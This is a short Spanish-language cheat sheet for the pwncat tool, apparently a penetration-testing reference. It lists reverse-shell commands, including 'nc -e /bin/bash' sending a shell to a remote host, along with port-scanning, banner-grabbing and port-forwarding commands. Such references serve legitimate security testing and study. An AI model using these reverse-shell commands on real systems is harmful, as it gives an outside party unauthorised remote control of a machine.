# Pwncat Cheat Sheet

#### Reverse Shell (Linux)

- `pwncat -l <Lisitening-Port> -vv`: Escuchando la conexión.

- `nc -e /bin/bash <Host> <Port>`: Conexión al host y mandamos la shell.

- `pwncat -l <Lisitening-Port> --self-inject /bin/bash:<Host>:<Port>`: Conexión al host y no perder el shell con CTRL + C.

- `pwncat -l <Lisitening-Port> -vv`: Recuperar la sesión si con el anterior comando se salió con CTRL + C.

#### Escanear Puertos TCP

- `pwncat -z <Host> 1-1000`: Escanear la IP del host con el rango de puertos.
- `pwncat -z <Host> 1-1000 -4`: Escanear la IP del host con el rango de puertos, solamente IPv4.
- `pwncat -z <Host> 1-1000 -6`: Escanear la IP del host con el rango de puertos, solamente IPv6.
- `pwncat -z <Host> 1-1000 --banner`: Escanear la IP del host con el rango de puertos y mostrar la versión detectada.

#### Escanear Puertos UDP

- `pwncat -z <Host> 1-1000 -u`: Escanear la IP del host con el rango de puertos.

#### Local Port Forward

- `pwncat -L 0.0.0.0:5000 loquesea.org 3306`: Hacer que el servidor de MySQL remoto (puerto 3306) esté disponible en la máquina actual en cada interfaz en el puerto 5000.

#### Remote Port Forward

- `pwncat -R 10.0.0.1:4000 loquesea.org 3306`: Conectarse al servidor de MySQL remoto (puerto 3306) y luego conectarse a otro servidor pwncat/netcat en 10.0.0.1:4000 y puentee el tráfico.

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)